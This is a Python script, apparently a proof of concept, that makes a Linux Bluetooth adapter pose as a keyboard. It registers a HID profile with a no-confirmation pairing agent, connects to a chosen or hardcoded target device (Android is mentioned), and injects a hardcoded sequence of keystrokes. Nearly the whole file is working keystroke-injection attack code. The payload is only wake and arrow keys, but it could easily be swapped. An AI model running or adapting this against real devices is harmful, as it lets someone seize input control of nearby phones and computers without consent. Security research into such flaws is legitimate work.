
#!/usr/bin/env python3
import binascii, bluetooth, sys, time, datetime, logging, argparse
import subprocess, os, re
from multiprocessing import Process
from pydbus import SystemBus
from enum import Enum

# DBus and GLib imports for HID Profile
import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib

# ==========================================
# CONFIGURATION & LOGGING
# ==========================================

# Default Target to prompt for
DEFAULT_TARGET_ADDR = "18:68:6A:FA:10:43"

# ANSI escape sequences for colors
class AnsiColorCode:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# Logging Setup
NOTICE_LEVEL = 25
logging.addLevelName(NOTICE_LEVEL, "NOTICE")

def notice(self, message, *args, **kwargs):
    if self.isEnabledFor(NOTICE_LEVEL):
        self._log(NOTICE_LEVEL, message, args, **kwargs)
logging.Logger.notice = notice

class ColorLogFormatter(logging.Formatter):
    COLOR_MAP = {
        logging.DEBUG: AnsiColorCode.BLUE,
        logging.INFO: AnsiColorCode.GREEN,
        logging.WARNING: AnsiColorCode.YELLOW,
        logging.ERROR: AnsiColorCode.RED,
        logging.CRITICAL: AnsiColorCode.RED,
        NOTICE_LEVEL: AnsiColorCode.BLUE,
    }
    def format(self, record):
        color = self.COLOR_MAP.get(record.levelno, AnsiColorCode.WHITE)
        message = super().format(record)
        return f'{color}{message}{AnsiColorCode.RESET}'

def setup_logging():
    log_format = "%(asctime)s - %(levelname)s - %(message)s"
    formatter = ColorLogFormatter(log_format)
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logging.basicConfig(level=logging.INFO, handlers=[handler])

log = logging.getLogger(__name__)

# ==========================================
# KEY CODES & ENUMS
# ==========================================

class Modifier_Codes(Enum):
    CTRL = 0x01
    SHIFT = 0x02
    ALT = 0x04
    GUI = 0x08
    RIGHTCTRL = 0x10
    RIGHTSHIFT = 0x20
    RIGHTALT = 0x40
    RIGHTGUI = 0x80

class Key_Codes(Enum):
    NONE = 0x00
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    RIGHT = 0x4f
    LEFT = 0x50
    DOWN = 0x51
    UP = 0x52
    # Add other keys if needed, but these are all we need for the requested payload

# ==========================================
# DBUS / HID PROFILE REGISTRATION
# ==========================================

class Agent(dbus.service.Object):
    @dbus.service.method("org.bluez.Agent1", in_signature="", out_signature="")
    def Cancel(self):
        log.debug("Agent.Cancel")

class Profile(dbus.service.Object):
    @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
    def Cancel(self):
        print("Profile.Cancel")

def agent_loop(target_path):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    loop = GLib.MainLoop()
    bus = dbus.SystemBus()
    path = "/test/agent"
    agent = Agent(bus, path)
    agent.target_path = target_path
    obj = bus.get_object("org.bluez", "/org/bluez")
    manager = dbus.Interface(obj, "org.bluez.AgentManager1")
    try:
        manager.RegisterAgent(path, "NoInputNoOutput")
        manager.RequestDefaultAgent(path)
        log.debug("'NoInputNoOutput' pairing-agent is running")
        loop.run()
    except Exception as e:
        log.error(f"Agent error: {e}")

def register_hid_profile(iface, addr):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    get_obj = lambda path, iface: dbus.Interface(bus.get_object("org.bluez", path), iface)
    addr_str = addr.replace(":", "_")
    # path = "/org/bluez/%s/dev_%s" % (iface, addr_str) # Unused in this logic but kept for reference
    manager = get_obj("/org/bluez", "org.bluez.ProfileManager1")
    profile_path = "/test/profile"
    profile = Profile(bus, profile_path)
    hid_uuid = "00001124-0000-1000-8000-00805F9B34FB"
    
    # Standard HID Keyboard SDP Record
    xml_content = """<?xml version="1.0" encoding="UTF-8" ?>
<record>
    <attribute id="0x0001"><sequence><uuid value="0x1124" /></sequence></attribute>
    <attribute id="0x0004"><sequence><sequence><uuid value="0x0100" /><uint16 value="0x0011" /></sequence><sequence><uuid value="0x0011" /></sequence></sequence></attribute>
    <attribute id="0x0005"><sequence><uuid value="0x1002" /></sequence></attribute>
    <attribute id="0x0006"><sequence><uint16 value="0x656e" /><uint16 value="0x006a" /><uint16 value="0x0100" /></sequence></attribute>
    <attribute id="0x0009"><sequence><sequence><uuid value="0x1124" /><uint16 value="0x0100" /></sequence></sequence></attribute>
    <attribute id="0x000d"><sequence><sequence><uuid value="0x0100" /><uint16 value="0x0013" /></sequence><sequence><uuid value="0x0011" /></sequence></sequence></attribute>
    <attribute id="0x0100"><text value="Keyboard" /></attribute>
    <attribute id="0x0101"><text value="Keyboard" /></attribute>
    <attribute id="0x0102"><text value="Keyboard" /></attribute>
    <attribute id="0x0200"><uint16 value="0x0148" /></attribute>
    <attribute id="0x0201"><uint16 value="0x0111" /></attribute>
    <attribute id="0x0202"><uint8 value="0x40" /></attribute>
    <attribute id="0x0203"><uint8 value="0x21" /></attribute>
    <attribute id="0x0204"><boolean value="true" /></attribute>
    <attribute id="0x0205"><boolean value="true" /></attribute>
    <attribute id="0x0206"><sequence><sequence><uint8 value="0x22" /><text encoding="hex" value="05010906a101850105071500250119e029e775019508810295057501050819012905910295017503910395087501150025010600ff09038103950675081500256505071900296581009501750115002501050c09008101950175010601ff09038102050c09409501750181029501750581030602ff09558555150026ff0075089540b1a2c00600ff0914a101859005847501950315002501096105850944094681029505810175089501150026ff0009658102c00600ff094ba1010600ff094b150026ff008520956b75088102094b852196890275088102094b8522953e75088102c0" /></sequence></sequence></attribute>
    <attribute id="0x0207"><sequence><sequence><uint16 value="0x0409" /><uint16 value="0x0100" /></sequence></sequence></attribute>
    <attribute id="0x0209"><boolean value="true" /></attribute>
    <attribute id="0x020a"><boolean value="true" /></attribute>
    <attribute id="0x020b"><uint16 value="0x0100" /></attribute>
    <attribute id="0x020c"><uint16 value="0x0fa0" /></attribute>
    <attribute id="0x020d"><boolean value="true" /></attribute>
    <attribute id="0x020e"><boolean value="true" /></attribute>
</record>"""

    opts = {"ServiceRecord": xml_content}
    log.debug("calling RegisterProfile")
    manager.RegisterProfile(profile, hid_uuid, opts)
    loop = GLib.MainLoop()
    try:
        loop.run()
    except KeyboardInterrupt:
        manager.UnregisterProfile(profile)

# ==========================================
# BLUETOOTH ADAPTER & CONNECTION LOGIC
# ==========================================

class ConnectionFailureException(Exception):
    pass

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        try:
            self.adapter = self.bus.get("org.bluez", f"/org/bluez/{iface}")
        except KeyError:
            log.error(f"Unable to find adapter '{iface}'")
            raise ConnectionFailureException("Adapter not found")

    def enable_ssp(self):
        try:
            # Enforce SSP mode
            subprocess.run(["sudo", "hciconfig", self.iface, "sspmode", "1"], check=True)
        except Exception as e:
            log.error(f"Error enabling SSP: {e}")

    def set_properties(self):
        # Set Class of Device to Keyboard
        subprocess.run(["sudo", "hciconfig", self.iface, "class", "0x002540"], check=False)
        # Set Name
        subprocess.run(["sudo", "hciconfig", self.iface, "name", "Robot POC"], check=False)
        # Ensure it is powered
        self.adapter.Powered = True

class PairingAgent:
    def __init__(self, iface, target_addr):
        self.iface = iface
        self.target_addr = target_addr
        dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
        self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

    def __enter__(self):
        self.agent = Process(target=agent_loop, args=(self.target_path,))
        self.agent.start()
        time.sleep(0.25)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.agent.is_alive():
            self.agent.terminate()

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    def encode_keyboard_input(self, *args):
        keycodes = []
        flags = 0
        for a in args:
            if isinstance(a, Key_Codes):
                keycodes.append(a.value)
            elif isinstance(a, Modifier_Codes):
                flags |= a.value
        keycodes += [0] * (7 - len(keycodes))
        report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
        return report

    def connect(self):
        log.info(f"Connecting to {self.addr} on port {self.port}...")
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        try:
            sock.connect((self.addr, self.port))
            self.sock = sock
            self.connected = True
            log.info(f"Connected on port {self.port}")
            return True
        except Exception as ex:
            log.error(f"Failed to connect on port {self.port}: {ex}")
            return False

    def send(self, data):
        if not self.connected:
            return
        try:
            self.sock.send(data)
        except bluetooth.btcommon.BluetoothError:
            self.connected = False

    def send_keypress(self, *args, delay=0.1):
        # Send press
        self.send(self.encode_keyboard_input(*args))
        time.sleep(delay)
        # Send release (empty report)
        self.send(self.encode_keyboard_input())
        time.sleep(delay)

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        # Connect SDP(1), HID Control(17), HID Interrupt(19)
        # Note: Android often only accepts 17 and 19 for HID.
        success = True
        for port, client in self.clients.items():
            if not client.connect():
                success = False
        return success

    def close_all(self):
        for client in self.clients.values():
            if client.sock:
                client.sock.close()

# ==========================================
# MAIN LOGIC
# ==========================================

def scan_for_devices():
    print("\nScanning for devices (8 seconds)...")
    try:
        nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=True)
    except Exception as e:
        print(f"Error scanning: {e}")
        return None

    if not nearby_devices:
        print("No devices found.")
        return None

    print(f"\nFound {len(nearby_devices)} device(s):")
    for idx, (addr, name, _) in enumerate(nearby_devices):
        print(f"[{idx + 1}] Name: {name}, Address: {addr}")

    while True:
        try:
            selection = input("\nSelect a device by number: ")
            idx = int(selection) - 1
            if 0 <= idx < len(nearby_devices):
                return nearby_devices[idx][0]
            else:
                print("Invalid selection.")
        except ValueError:
            print("Please enter a number.")

def execute_hardcoded_payload(client):
    log.info("Starting Payload execution...")
    
    # CRITICAL: Wait for Android to settle the connection
    print("Waiting 5 seconds for connection stability...")
    time.sleep(5) 

    # 1. Wake up / Attention (using SPACE as it's safer than ESCAPE)
    log.info("Sending wakeup keys...")
    client.send_keypress(Key_Codes.SPACE, delay=0.5)
    time.sleep(2)
    client.send_keypress(Key_Codes.ENTER, delay=0.5)
    time.sleep(1)

    # 2. Arrow DOWN
    log.info("Sending Arrow DOWN")
    client.send_keypress(Key_Codes.DOWN, delay=0.2)
    time.sleep(1)

    # 3. Arrow RIGHT x4
    log.info("Sending Arrow RIGHT x4")
    for i in range(4):
        client.send_keypress(Key_Codes.RIGHT, delay=0.2)
        time.sleep(0.5)

    log.info("Payload complete. Exiting.")

def main():
    blue = "\033[94m"
    reset = "\033[0m"
    
    # 1. Ask user about specific target
    print(f"\nDo you want to use mac address {blue}{DEFAULT_TARGET_ADDR}{reset}?")
    choice = input("(yes/no): ").lower().strip()

    target_address = ""
    if choice in ['y', 'yes']:
        target_address = DEFAULT_TARGET_ADDR
    else:
        target_address = scan_for_devices()

    if not target_address:
        print("No target selected. Exiting.")
        return

    print(f"\nTarget set to: {blue}{target_address}{reset}")
    
    # 2. Setup Bluetooth (Without restarting service!)
    adapter_id = 'hci0'
    adapter = Adapter(adapter_id)
    adapter.set_properties() # Set Class/Name
    adapter.enable_ssp()

    # 3. Start Profile Registration in background
    profile_proc = Process(target=register_hid_profile, args=(adapter_id, target_address))
    profile_proc.start()

    # 4. Connection Loop
    connection_manager = L2CAPConnectionManager(target_address)
    connection_manager.create_connection(1)   # SDP
    connection_manager.create_connection(17)  # HID Control
    connection_manager.create_connection(19)  # HID Interrupt

    try:
        # Start Pairing Agent
        with PairingAgent(adapter_id, target_address):
            log.info("Attempting to connect...")
            if connection_manager.connect_all():
                # Connection Successful
                hid_client = connection_manager.clients[19]
                
                # EXECUTE PAYLOAD
                execute_hardcoded_payload(hid_client)
            else:
                log.error("Failed to establish all connections.")

    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        connection_manager.close_all()
        if profile_proc.is_alive():
            profile_proc.terminate()
        
        # Cleanup
        subprocess.run(f'echo -e "remove {target_address}\n" | bluetoothctl', shell=True)
        print("Cleaned up.")

if __name__ == "__main__":
    setup_logging()
    # Check root
    if os.geteuid() != 0:
        print("This script must be run as root (sudo).")
        sys.exit(1)
        
    main()
